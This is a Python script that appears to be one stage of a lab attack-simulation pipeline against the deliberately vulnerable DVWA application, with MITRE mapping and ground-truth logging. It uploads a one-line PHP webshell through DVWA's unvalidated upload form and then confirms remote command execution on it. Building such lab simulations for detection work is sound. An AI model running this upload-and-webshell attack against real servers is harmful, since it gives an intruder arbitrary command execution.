"""
Stage 4 - Unrestricted file upload -> remote code execution
(MITRE TA0002 / T1505.003)

Targets vulnerabilities/upload/ which at low security performs no
extension/content-type validation. Uploads a minimal PHP webshell, then
confirms it is reachable at hackable/uploads/<filename>.

The webshell (`<?php system($_GET['cmd']); ?>`) is the standard teaching
payload for DVWA's upload module (used verbatim in OWASP/DVWA training
material) -- it only runs inside your own isolated lab container, never
against a system you don't control.
"""
import config
from attacks.dvwa_session import DvwaSession, GroundTruth, now_iso


def run(dvwa: DvwaSession, gt: GroundTruth) -> dict:
    shell_url = None
    with gt.stage("upload_rce", {"filename": config.WEBSHELL_FILENAME}):
        files = {"uploaded": (config.WEBSHELL_FILENAME, config.WEBSHELL_PHP_SOURCE, "application/x-php")}
        r = dvwa.post("vulnerabilities/upload/", files=files, data={"Upload": "Upload"})
        gt.note("upload_rce", "upload request sent", status=r.status_code, timestamp=now_iso())

        candidate_url = f"{dvwa.base_url}/hackable/uploads/{config.WEBSHELL_FILENAME}"
        verify = dvwa.session.get(candidate_url, params={"cmd": "echo lab_shell_ok"}, timeout=10)
        if verify.status_code == 200 and "lab_shell_ok" in verify.text:
            shell_url = candidate_url
            gt.note("upload_rce", "webshell confirmed live", url=shell_url)
        else:
            gt.note("upload_rce", "webshell verification failed", status=verify.status_code)
    return {"shell_url": shell_url}


if __name__ == "__main__":
    dvwa = DvwaSession()
    dvwa.login()
    print(run(dvwa, GroundTruth()))
